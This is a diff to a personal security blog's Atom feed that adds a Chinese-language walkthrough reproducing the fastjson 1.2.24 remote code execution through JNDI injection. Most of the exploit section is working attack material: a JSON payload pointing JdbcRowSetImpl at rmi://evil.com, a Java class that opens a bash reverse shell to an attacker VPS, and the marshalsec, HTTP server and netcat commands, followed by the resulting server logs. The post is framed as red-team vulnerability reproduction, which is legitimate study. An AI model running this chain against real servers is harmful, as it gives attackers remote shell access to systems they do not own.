@@ -1,4 +1,105 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-04-08T17:13:59+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Yueyejian’s Blog</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><author><name>yueyejian</name></author><entry><title type="html">Jndi</title><link href="http://localhost:4000/JNDI/" rel="alternate" type="text/html" title="Jndi" /><published>2024-04-08T00:00:00+08:00</published><updated>2024-04-08T00:00:00+08:00</updated><id>http://localhost:4000/JNDI</id><content type="html" xml:base="http://localhost:4000/JNDI/"><![CDATA[]]></content><author><name>yueyejian</name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Hikvision综合安防管理平台文件上传</title><link href="http://localhost:4000/vul/hikvision/" rel="alternate" type="text/html" title="Hikvision综合安防管理平台文件上传" /><published>2023-11-22T00:00:00+08:00</published><updated>2023-11-22T00:00:00+08:00</updated><id>http://localhost:4000/vul/hikvision</id><content type="html" xml:base="http://localhost:4000/vul/hikvision/"><![CDATA[<p>想要成为红队大佬，复现漏洞少不了</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-04-10T14:53:46+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Yueyejian’s Blog</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><author><name>yueyejian</name></author><entry><title type="html">fastjson-1.2.24-RCE</title><link href="http://localhost:4000/vul/fastjson/" rel="alternate" type="text/html" title="fastjson-1.2.24-RCE" /><published>2024-04-08T00:00:00+08:00</published><updated>2024-04-08T00:00:00+08:00</updated><id>http://localhost:4000/vul/fastjson</id><content type="html" xml:base="http://localhost:4000/vul/fastjson/"><![CDATA[<h1 id="fastjson-1224-rce">Fastjson-1.2.24-RCE</h1>
+<h2 id="0x00-漏洞概述">0x00 漏洞概述</h2>
+<p>fastjson是一个由阿里巴巴开发的Java库，用于处理json数据。fastjson在17年的1.2.24版本首次爆出了一个RCE漏洞，原理是<code class="language-plaintext highlighter-rouge">jndi注入</code>。很快阿里发布了新的版本1.2.25，通过<code class="language-plaintext highlighter-rouge">checkAutoType()</code>这个函数来防御这个漏洞。</p>
+
+<p>后来针对<code class="language-plaintext highlighter-rouge">checkAutoType()</code>这个函数，出现了一系列的绕过手段以及修复补丁。</p>
+
+<p><img src="/images/vul/fastjson/1.png" alt="" /></p>
+
+<h2 id="0x01-漏洞原理">0x01 漏洞原理</h2>
+
+<p><strong>fastjson RCE关键函数</strong></p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">DefaultJSONParser</span><span class="o">.</span> <span class="nf">parseObject</span><span class="o">()</span>  <span class="err">#</span><span class="n">解析传入的</span> <span class="n">json</span> <span class="n">字符串提取不同的</span> <span class="n">key</span> <span class="n">进行后续的处理</span><span class="err">。</span>
+</code></pre></div></div>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">TypeUtils</span><span class="o">.</span> <span class="nf">loadClass</span><span class="o">()</span> <span class="err">#</span><span class="n">根据传入的类名</span><span class="err">，</span><span class="n">生成类的实例</span><span class="err">。</span>
+</code></pre></div></div>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">JavaBeanDeserializer</span><span class="o">.</span> <span class="nf">Deserialze</span><span class="o">()</span> <span class="err">#</span><span class="n">依次调用</span> <span class="nd">@type</span> <span class="n">中传入类的对象公有</span> <span class="n">set</span><span class="err">\</span><span class="n">get</span><span class="err">\</span><span class="n">is</span> <span class="n">方法</span><span class="err">。</span>
+</code></pre></div></div>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">ParserConfig</span><span class="o">.</span> <span class="nf">checkAutoType</span><span class="o">()</span> <span class="err">#</span><span class="n">阿里后续添加的防护函数</span><span class="err">，</span><span class="n">用于在</span> <span class="n">loadclass</span> <span class="n">前检查传入的类是否合法</span><span class="err">。</span>
+</code></pre></div></div>
+
+<p><strong>Payload</strong></p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+    </span><span class="nl">"b"</span><span class="p">:{</span><span class="w">
+        </span><span class="nl">"@type"</span><span class="p">:</span><span class="s2">"com.sun.rowset.JdbcRowSetImpl"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"dataSourceName"</span><span class="p">:</span><span class="s2">"rmi://evil.com:9999/"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"autoCommit"</span><span class="p">:</span><span class="kc">true</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>该Payload有效的原理是：fastjson 在处理以<code class="language-plaintext highlighter-rouge">@type</code>形式传入的类的时候，会默认调用该类的共有 <code class="language-plaintext highlighter-rouge">set\get\is</code> 函数，因此我们在寻找利用类的时候思路如下：</p>
+
+<p>1、类的成员变量我们可以控制；</p>
+
+<p>2、想办法在调用类的某个<code class="language-plaintext highlighter-rouge">set\get\is</code>函数的时候造成命令执行。</p>
+
+<p>于是便找到了 <code class="language-plaintext highlighter-rouge">JdbcRowSetImpl</code> 类，该类在 <code class="language-plaintext highlighter-rouge">setAutoCommit</code> 函数中会对成员变量 <code class="language-plaintext highlighter-rouge">dataSourceName</code> 进行 <code class="language-plaintext highlighter-rouge">lookup</code>，标准的 jndi注入利用。</p>
+
+<h2 id="0x03-环境搭建">0x03 环境搭建</h2>
+
+<p><img src="/images/vul/fastjson/2.png" alt="" /></p>
+
+<p><img src="/images/vul/fastjson/3.png" alt="" /></p>
+
+<p>（ps：漏洞环境搭建、http服务、rmi服务都是在vps上面起的）</p>
+<h2 id="0x04-exploit">0x04 Exploit</h2>
+
+<p>先起一个http服务，内容是用<code class="language-plaintext highlighter-rouge">javac</code>命令编译<code class="language-plaintext highlighter-rouge">reverse.java</code>后的<code class="language-plaintext highlighter-rouge">reverse.class</code>文件</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//reverse.java </span>
+<span class="c1">//执行反弹shell命令</span>
+<span class="kn">import</span> <span class="nn">java.lang.Runtime</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.Process</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">reverse</span> <span class="o">{</span>
+<span class="kd">static</span> <span class="o">{</span>
+<span class="k">try</span> <span class="o">{</span>
+<span class="nc">Runtime</span> <span class="n">rt</span> <span class="o">=</span> <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">();</span>
+
+
+<span class="nc">String</span><span class="o">[]</span> <span class="n">commands</span> <span class="o">=</span> <span class="o">{</span><span class="s">"/bin/bash"</span><span class="o">,</span><span class="s">"-c"</span><span class="o">,</span><span class="s">"bash -i &gt;&amp; /dev/tcp/{vps_ip}/2333 0&gt;&amp;1"</span><span class="o">};</span>
+<span class="nc">Process</span> <span class="n">pc</span> <span class="o">=</span> <span class="n">rt</span><span class="o">.</span><span class="na">exec</span><span class="o">(</span><span class="n">commands</span><span class="o">);</span>
+<span class="n">pc</span><span class="o">.</span><span class="na">waitFor</span><span class="o">();</span>
+<span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+<span class="o">}</span>
+<span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -m http.server 80
+</code></pre></div></div>
+
+<p>然后用<code class="language-plaintext highlighter-rouge">marshalsec</code>工具起一个<code class="language-plaintext highlighter-rouge">rmi服务</code>，这个服务需要借助刚刚搭建的<code class="language-plaintext highlighter-rouge">http</code>服务上的<code class="language-plaintext highlighter-rouge">.class</code>文件，端口就用8888</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">java</span> <span class="o">-</span><span class="n">cp</span> <span class="n">marshalsec</span><span class="o">-</span><span class="mf">0.0</span><span class="o">.</span><span class="mi">3</span><span class="o">-</span><span class="no">SNAPSHOT</span><span class="o">-</span><span class="n">all</span><span class="o">.</span><span class="na">jar</span> <span class="n">marshalsec</span><span class="o">.</span><span class="na">jndi</span><span class="o">.</span><span class="na">RMIRefServer</span> <span class="s">"http://{vps_ip}/#reverse"</span> <span class="mi">8888</span>
+</code></pre></div></div>
+
+<p>https://github.com/mbechler/marshalsec</p>
+
+<p>对了，这个工具需要<code class="language-plaintext highlighter-rouge">java8</code>，所以别忘了提前装好<code class="language-plaintext highlighter-rouge">jdk8</code>，并切换到<code class="language-plaintext highlighter-rouge">java8</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>update-alternatives --config java
+</code></pre></div></div>
+
+<p>当rmi服务搭建好的时候就可以用payload来进行攻击了，先用<code class="language-plaintext highlighter-rouge">nc -lvp 2333</code>监听.class文件对应的反弹shell端口，然后发送payload</p>
+
+<p><img src="/images/vul/fastjson/4.png" alt="" /></p>
+
+<p><img src="/images/vul/fastjson/5.png" alt="" /></p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">#RMI server recall
+Have connection from /172.21.0.2:33922
+Reading message...
+Is RMI.lookup call for 1 2
+Sending remote classloading stub targeting http://{vps_ip}/reverse.class
+Closing connection
+</span></code></pre></div></div>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">#HTTP server recall
+172.21.0.2 - - [10/Apr/2024 02:45:49] "GET /reverse.class HTTP/1.1" 200 
+</span></code></pre></div></div>]]></content><author><name>yueyejian</name></author><category term="[&quot;vul&quot;]" /><category term="fastjson" /><category term="web" /><category term="java" /><summary type="html"><![CDATA[Fastjson-1.2.24-RCE 0x00 漏洞概述 fastjson是一个由阿里巴巴开发的Java库，用于处理json数据。fastjson在17年的1.2.24版本首次爆出了一个RCE漏洞，原理是jndi注入。很快阿里发布了新的版本1.2.25，通过checkAutoType()这个函数来防御这个漏洞。]]></summary></entry><entry><title type="html">Hikvision综合安防管理平台文件上传</title><link href="http://localhost:4000/vul/hikvision/" rel="alternate" type="text/html" title="Hikvision综合安防管理平台文件上传" /><published>2023-11-22T00:00:00+08:00</published><updated>2023-11-22T00:00:00+08:00</updated><id>http://localhost:4000/vul/hikvision</id><content type="html" xml:base="http://localhost:4000/vul/hikvision/"><![CDATA[<p>想要成为红队大佬，复现漏洞少不了</p>
 
 <p><img src="/images/vul/hikvision/1.png" alt="" /></p>
 
